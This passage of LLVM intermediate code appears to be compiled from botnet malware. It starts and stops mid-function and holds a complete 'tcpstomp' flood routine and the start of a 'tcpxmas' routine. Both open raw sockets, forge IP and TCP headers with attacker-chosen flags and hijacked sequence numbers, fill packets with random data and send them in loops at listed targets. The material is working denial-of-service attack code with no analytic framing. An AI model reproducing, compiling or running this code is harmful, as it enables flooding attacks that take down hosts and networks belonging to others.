  %176 = bitcast i8* %175 to i16*
  store i16 0, i16* %176, align 4
  %177 = call zeroext i16 @htons(i16 zeroext %84) #11
  %178 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %131, i8* %132, i16 zeroext %177, i32 %85)
  store i16 %178, i16* %176, align 4
  %179 = getelementptr inbounds i8, i8* %130, i64 22
  %180 = bitcast i8* %179 to i16*
  %181 = load i16, i16* %180, align 2
  %182 = sext i32 %170 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %40, i8* %130, i64 %86, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %46
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #10
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre165 = sext i32 %37 to i64
  %.pre166 = add nsw i64 %.pre165, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #10
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi167 = phi i64 [ %.pre166, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre165, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = add nsw i64 %.pre-phi, 20
  %90 = trunc i64 %89 to i16
  %91 = trunc i64 %89 to i32
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %92 = phi i32 [ %187, %.backedge ], [ %84, %.lr.ph161.preheader ]
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i32 0) #10
  %94 = or i32 %93, 2048
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 4, i32 %94) #10
  store i16 2, i16* %48, align 4
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 1
  %102 = load i32, i32* %101, align 4
  br i1 %100, label %103, label %106

; <label>:103:                                    ; preds = %.lr.ph161
  %104 = call i32 @ntohl(i32 %102) #11
  %105 = call i32 @htonl(i32 %104) #11
  br label %106

; <label>:106:                                    ; preds = %.lr.ph161, %103
  %.sink = phi i32 [ %105, %103 ], [ %102, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %109, label %107

; <label>:107:                                    ; preds = %106
  %108 = call zeroext i16 @htons(i16 zeroext %24) #11
  br label %109

; <label>:109:                                    ; preds = %106, %107
  %.sink3 = phi i16 [ %108, %107 ], [ 0, %106 ]
  store i16 %.sink3, i16* %52, align 2
  %110 = call i32 @connect(i32 %92, %struct.sockaddr* nonnull %53, i32 16) #10
  %111 = call i64 @time(i64* null) #10
  br label %112

; <label>:112:                                    ; preds = %189, %109
  store i32 16, i32* %8, align 4
  %113 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %114 = trunc i64 %113 to i32
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %.loopexit150.loopexit, label %116

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* %56, align 4
  %118 = load i32, i32* %49, align 4
  %119 = icmp eq i32 %117, %118
  br i1 %119, label %120, label %189

; <label>:120:                                    ; preds = %116
  %sext = shl i64 %113, 32
  %121 = ashr exact i64 %sext, 32
  %122 = icmp ugt i64 %121, 40
  br i1 %122, label %123, label %189

; <label>:123:                                    ; preds = %120
  %124 = load i16, i16* %58, align 4
  %125 = load i16, i16* %52, align 2
  %126 = icmp eq i16 %124, %125
  br i1 %126, label %127, label %189

; <label>:127:                                    ; preds = %123
  %128 = load i16, i16* %60, align 16
  %129 = and i16 %128, 4608
  %130 = icmp eq i16 %129, 4608
  br i1 %130, label %131, label %182

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 0
  store i32 %117, i32* %134, align 4
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %136 = load i32, i32* %135, align 4
  %137 = call i32 @ntohl(i32 %136) #11
  %138 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 1
  store i32 %137, i32* %138, align 4
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #11
  %142 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 2
  store i32 %141, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %144 = load i16, i16* %143, align 2
  %145 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 3
  store i16 %144, i16* %145, align 4
  %146 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 4
  store i16 %124, i16* %146, align 2
  %147 = call noalias i8* @malloc(i64 %62) #10
  %148 = getelementptr inbounds i8*, i8** %14, i64 %133
  store i8* %147, i8** %148, align 8
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  %151 = getelementptr inbounds i8, i8* %147, i64 40
  store i8 69, i8* %147, align 4
  %152 = getelementptr inbounds i8, i8* %147, i64 1
  store i8 %16, i8* %152, align 1
  %153 = call zeroext i16 @htons(i16 zeroext %63) #11
  %154 = getelementptr inbounds i8, i8* %147, i64 2
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %18) #11
  %157 = getelementptr inbounds i8, i8* %147, i64 4
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %147, i64 8
  store i8 %20, i8* %159, align 4
  br i1 %64, label %164, label %160

; <label>:160:                                    ; preds = %131
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %162 = getelementptr inbounds i8, i8* %147, i64 6
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 2
  br label %164

; <label>:164:                                    ; preds = %131, %160
  %165 = getelementptr inbounds i8, i8* %147, i64 9
  store i8 6, i8* %165, align 1
  %166 = load i32, i32* @LOCAL_ADDR, align 4
  %167 = getelementptr inbounds i8, i8* %147, i64 12
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %147, i64 16
  %170 = bitcast i8* %169 to i32*
  store i32 %117, i32* %170, align 4
  %171 = bitcast i8* %149 to i16*
  store i16 %144, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %147, i64 22
  %173 = bitcast i8* %172 to i16*
  store i16 %124, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %147, i64 24
  %175 = bitcast i8* %174 to i32*
  store i32 %141, i32* %175, align 4
  %176 = getelementptr inbounds i8, i8* %147, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 %137, i32* %177, align 4
  %178 = getelementptr inbounds i8, i8* %147, i64 32
  %179 = bitcast i8* %178 to i16*
  %180 = getelementptr inbounds i8, i8* %147, i64 34
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  store i16 %81, i16* %179, align 4
  call void @rand_str(i8* %151, i32 %37)
  br label %.loopexit152

; <label>:182:                                    ; preds = %127
  %183 = and i16 %128, 1280
  %184 = icmp eq i16 %183, 0
  br i1 %184, label %189, label %185

; <label>:185:                                    ; preds = %182
  %186 = call i32 @close(i32 %92) #10
  br label %.backedge

.backedge:                                        ; preds = %185, %193
  %187 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:189:                                    ; preds = %182, %123, %120, %116
  %190 = call i64 @time(i64* null) #10
  %191 = sub nsw i64 %190, %111
  %192 = icmp sgt i64 %191, 10
  br i1 %192, label %193, label %112

; <label>:193:                                    ; preds = %189
  %194 = call i32 @close(i32 %92) #10
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %164
  %.1 = phi %struct.tcphdr* [ %150, %164 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %46
  br i1 %197, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %209
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %209
  %storemerge139160 = phi i32 [ %243, %209 ], [ 0, %.lr.ph.preheader ]
  %198 = sext i32 %storemerge139160 to i64
  %199 = getelementptr inbounds i8*, i8** %14, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 40
  br i1 %87, label %204, label %207

; <label>:204:                                    ; preds = %.lr.ph
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %204, %.lr.ph
  br i1 %88, label %209, label %208

; <label>:208:                                    ; preds = %207
  call void @rand_str(i8* %203, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %209

; <label>:209:                                    ; preds = %207, %208
  %210 = phi i32 [ %storemerge139160, %207 ], [ %.pre, %208 ]
  %211 = getelementptr inbounds i8, i8* %200, i64 10
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  %213 = bitcast i8* %200 to i16*
  %214 = call zeroext i16 @checksum_generic(i16* %213, i32 20)
  store i16 %214, i16* %212, align 2
  %215 = sext i32 %210 to i64
  %216 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %215, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %216, align 4
  %219 = trunc i32 %217 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #11
  %221 = zext i16 %220 to i32
  %222 = getelementptr inbounds i8, i8* %200, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %221, i32* %223, align 4
  %224 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %215, i32 2
  %225 = load i32, i32* %224, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #11
  %228 = zext i16 %227 to i32
  %229 = getelementptr inbounds i8, i8* %200, i64 28
  %230 = bitcast i8* %229 to i32*
  store i32 %228, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 36
  %232 = bitcast i8* %231 to i16*
  store i16 0, i16* %232, align 4
  %233 = call zeroext i16 @htons(i16 zeroext %90) #11
  %234 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %233, i32 %91)
  store i16 %234, i16* %232, align 4
  %235 = getelementptr inbounds i8, i8* %200, i64 22
  %236 = bitcast i8* %235 to i16*
  %237 = load i16, i16* %236, align 2
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0, i32 1
  store i16 %237, i16* %238, align 2
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0
  %240 = bitcast %struct.sockaddr_in* %239 to %struct.sockaddr*
  %241 = call i64 @sendto(i32 %40, i8* %200, i64 %.pre-phi167, i32 16384, %struct.sockaddr* %240, i32 16) #10
  %242 = load i32, i32* %5, align 4
  %243 = add nsw i32 %242, 1
  store i32 %243, i32* %5, align 4
  %244 = icmp slt i32 %243, %46
  br i1 %244, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %112
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %82
  ret void
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #10
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre165 = sext i32 %37 to i64
  %.pre166 = add nsw i64 %.pre165, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #10
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi167 = phi i64 [ %.pre166, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre165, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = add nsw i64 %.pre-phi, 20
  %90 = trunc i64 %89 to i16
  %91 = trunc i64 %89 to i32
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %92 = phi i32 [ %187, %.backedge ], [ %84, %.lr.ph161.preheader ]
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i32 0) #10
  %94 = or i32 %93, 2048
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 4, i32 %94) #10
  store i16 2, i16* %48, align 4
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 1
  %102 = load i32, i32* %101, align 4
  br i1 %100, label %103, label %106

; <label>:103:                                    ; preds = %.lr.ph161
  %104 = call i32 @ntohl(i32 %102) #11
  %105 = call i32 @htonl(i32 %104) #11
  br label %106

; <label>:106:                                    ; preds = %.lr.ph161, %103
  %.sink = phi i32 [ %105, %103 ], [ %102, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %109, label %107

; <label>:107:                                    ; preds = %106
  %108 = call zeroext i16 @htons(i16 zeroext %24) #11
  br label %109

; <label>:109:                                    ; preds = %106, %107
  %.sink3 = phi i16 [ %108, %107 ], [ 0, %106 ]
  store i16 %.sink3, i16* %52, align 2
  %110 = call i32 @connect(i32 %92, %struct.sockaddr* nonnull %53, i32 16) #10
  %111 = call i64 @time(i64* null) #10
  br label %112

; <label>:112:                                    ; preds = %189, %109
  store i32 16, i32* %8, align 4
  %113 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %114 = trunc i64 %113 to i32
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %.loopexit150.loopexit, label %116

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* %56, align 4
  %118 = load i32, i32* %49, align 4
  %119 = icmp eq i32 %117, %118
  br i1 %119, label %120, label %189

; <label>:120:                                    ; preds = %116
  %sext = shl i64 %113, 32
  %121 = ashr exact i64 %sext, 32
  %122 = icmp ugt i64 %121, 40
  br i1 %122, label %123, label %189

; <label>:123:                                    ; preds = %120
  %124 = load i16, i16* %58, align 4
  %125 = load i16, i16* %52, align 2
  %126 = icmp eq i16 %124, %125
  br i1 %126, label %127, label %189

; <label>:127:                                    ; preds = %123
  %128 = load i16, i16* %60, align 16
  %129 = and i16 %128, 4608
  %130 = icmp eq i16 %129, 4608
  br i1 %130, label %131, label %182

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 0
  store i32 %117, i32* %134, align 4
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %136 = load i32, i32* %135, align 4
  %137 = call i32 @ntohl(i32 %136) #11
  %138 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 1
  store i32 %137, i32* %138, align 4
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #11
  %142 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 2
  store i32 %141, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %144 = load i16, i16* %143, align 2
  %145 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 3
  store i16 %144, i16* %145, align 4
  %146 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 4
  store i16 %124, i16* %146, align 2
  %147 = call noalias i8* @malloc(i64 %62) #10
  %148 = getelementptr inbounds i8*, i8** %14, i64 %133
  store i8* %147, i8** %148, align 8
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  %151 = getelementptr inbounds i8, i8* %147, i64 40
  store i8 69, i8* %147, align 4
